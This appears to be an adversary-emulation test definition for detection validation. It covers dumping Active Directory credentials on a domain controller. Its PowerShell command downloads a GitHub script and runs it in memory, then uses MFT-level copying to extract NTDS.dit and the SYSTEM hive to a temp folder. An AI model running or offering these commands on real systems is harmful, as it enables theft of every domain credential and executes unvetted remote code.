- id: f36b7a5c-75b9-58bc-bdc9-306d3bd01f74
  name: Soumaia ART Tests - Copy NTDS in low level NTFS acquisition via MFT parsing
  description: 'This test is intended to be run on a domain Controller.


    UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running). (requires elevation)'
  tactic: credential-access
  technique:
    attack_id: T1003.003
    name: 'OS Credential Dumping: NTDS'
  platforms:
    windows:
      psh:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing)
          Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Windows\Temp\ntds.dit
          Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE
        cleanup: |-
          remove-item "C:\Windows\Temp\ntds.dit" -force -erroraction silentlycontinue
          remove-item "C:\Windows\Temp\SYSTEM_HIVE" -force -erroraction silentlycontinue
